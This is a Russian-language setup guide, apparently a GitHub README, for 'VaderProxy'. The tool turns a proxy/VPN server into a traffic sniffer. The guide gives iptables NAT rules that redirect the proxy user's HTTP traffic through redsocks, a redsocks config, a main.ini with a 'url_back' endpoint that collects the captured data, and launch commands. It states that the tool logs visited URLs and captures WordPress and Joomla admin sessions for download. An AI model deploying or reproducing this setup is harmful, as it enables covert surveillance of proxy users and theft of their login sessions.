<h2>VaderProxy</h2>
<img src = 'https://github.com/vaderproxy/vadersocks5/blob/main/logo.jpg?raw=true' /> <br />
 <p>
 Предполагается что у вас уже установлен proxy/vpn сервер на линуксе, процесс установки я пропущу.
  Желательно чтобы исходящий траффик был от любого пользователя, кроме рут
   </p>
   
  <p>Рассмотрю настройку VaderProxy на centos 7, Ubuntu практически идентично.
Первое что нужно сделать - открыть файл /etc/security/limits.conf и дописать в конце:
  <pre>
* soft nproc 999999
* hard nproc 999999
* soft nofile 999999
* hard nofile 999999
  </pre>
  Далее нужно перезагрузить компьютер, иначе прокси будет падать практически с нулевым траффиком
</p>

<p>
  Удаляем firewalld, ставим iptables вместо стандартного файервола centos
  <pre>
  service firewalld stop
  yum remove firewalld
  yum install iptables-services
  systemctl enable iptables.service
  </pre>
  Нам также понадобится утилита redsocks, тут подробный мануал как установить:
  https://crosp.net/blog/administration/install-configure-redsocks-proxy-centos-linux/
  Желательно в процессе сборки указать размер буфера 8192, это константа объявлена в самом большом .c файле, увидите.
</p>  

<p>
Вот примерно как должен выглядеть IPTABLES конфиг:
<pre>
# Generated by iptables-save v1.8.4 
*filter
:INPUT ACCEPT [223:21556]
:FORWARD ACCEPT [0:0]
:OUTPUT ACCEPT [230:19079]
-A INPUT -p tcp --dport 8888 -s АЙПИ_СЕРВЕРА -j ACCEPT
-A INPUT -p tcp --dport 8888 -j DROP
-A INPUT -p tcp --dport 8887 -s АЙПИ_СЕРВЕРА -j ACCEPT
-A INPUT -p tcp --dport 8887 -j DROP

COMMIT

*nat
:PREROUTING ACCEPT [0:0]
:INPUT ACCEPT [0:0]
:OUTPUT ACCEPT [0:0]
:POSTROUTING ACCEPT [0:0]
-A OUTPUT  -p tcp -m tcp --dport 80 -m owner  --uid-owner ID_USER -j REDIRECT --to-ports 8888
COMMIT

</pre>
В данном случае у нас на порту 8888 висит redsocks(vaderproxy на 8887), мы блочим доступ всем ip кроме iptables.
IP сервера это именно тот айпи к которому вы подрубились, если указать 127.0.0.1 ничего работать не будет, очевидно но тем не менее.
ID_USER это id пользователя, который выполняет роль прокси/vpn на вашем сервере. Именно по этой причине лучше чтобы этим пользователем был не рут.
Нам также понадобится пользователь для нашего сниффера, поэтому смело 
<pre>
adduser java
#или даже так
adduser redsocks
</pre>
</p>

<p>
Вот пример файла redsocks.conf:
<pre>

base {
        // debug: connection progress & client list on SIGUSR1
        log_debug = off;
        // info: start and end of client session
        log_info = off;
        /* possible `log' values are:
         *   stderr
         *   "file:/path/to/file"
         *   syslog:FACILITY  facility is any of "daemon", "local0"..."local7"
         */
        log = "file:/home/redsocks/log.txt";

        // detach from console
        daemon = on;

        /* Change uid, gid and root directory, these options require root
         * privilegies on startup.
         * Note, your chroot may requre /etc/localtime if you write log to syslog.
         * Log is opened before chroot & uid changing.
         */
        user = redsocks;
        group = redsocks;
        // chroot = "/var/chroot";

        /* possible `redirector' values are:
         *   iptables   - for Linux
         *   ipf        - for FreeBSD
         *   pf         - for OpenBSD
         *   generic    - some generic redirector that MAY work
         */
        redirector = iptables;
}

redsocks {
        local_ip = 0.0.0.0;
        local_port = 8888;

        ip = ВАШ_АЙПИ; //
        port = 8887;

        type = socks5;

        // login = "foobar";
        // password = "baz";
}

</pre>

Копируем все из папки dist в папку /home/java/vader, далее следует отредактировать файл main.ini

<pre>
[main]
network_interface=eth0  ---> тут нужно указать сетевой интерфейс айпи к которому вы подключились
url_back=http://localhost/vader ---> можете указать любой урл где можно принимать get/post запросы и писать в файл
script_config=1.ini -> это не трогаем
allow_all_ip=y -> лучше запретить все айпи, то есть n
my_ip=127.0.0.1 -> ip server'a
allowed_ips=127.0.0.1 -> ip server'a ,или список ипов через запятую
port=8887   -> это я думаю понятно что такое
</pre>

В консоли набираем:
<pre>
su java
cd /home/java/vader
nohup java -jar VaderProxy.jar &
</pre>

Как быстрo проверить что все работает? Юзер , который отвечает за vpn/proxy, должен быть с включенной консолью в /etc/passwd
Делаем su proxy_user, далее curl http://mail.ru
Если все настроено правильно -вы увидите файл logs.txt, куда пишутся посещенный урлы.
Также в процессе работы появятся 2 файла:
<br />debug.txt   -> тут содержатся урлы всех отстуков в админку, кроме админских сессий вп и жумла
<br />debug2.txt   -> тут идут отстуки админских сессий, если нет желания создавать узера с админ правами, файл пользы не несет.

Вот и все! Админка по сути это тот же прямой append text to file, только в виде таблицы и возможностью скачать.
</p>

